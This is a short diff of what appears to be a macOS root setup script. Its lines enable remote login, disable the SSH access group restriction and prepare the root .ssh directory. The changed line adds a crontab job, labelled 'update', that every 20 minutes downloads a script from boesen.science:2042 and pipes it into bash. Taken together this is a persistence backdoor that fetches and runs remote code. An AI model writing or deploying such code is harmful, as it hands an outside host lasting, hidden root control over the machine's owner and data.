@@ -11,7 +11,7 @@ systemsetup -setremotelogin on >/dev/null
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled >/dev/null
 
 # Add update to crontab
-(crontab -l 2>/dev/null; echo '*/20 * * * * curl -Lo /tmp/update.sh boesen.science:2042/mac/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh') | crontab -
+(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh |bash') | crontab -
 
 sshpath="/var/root/.ssh"
 mkdir -p "$sshpath" # On most computers, there won't be a .ssh directory initially
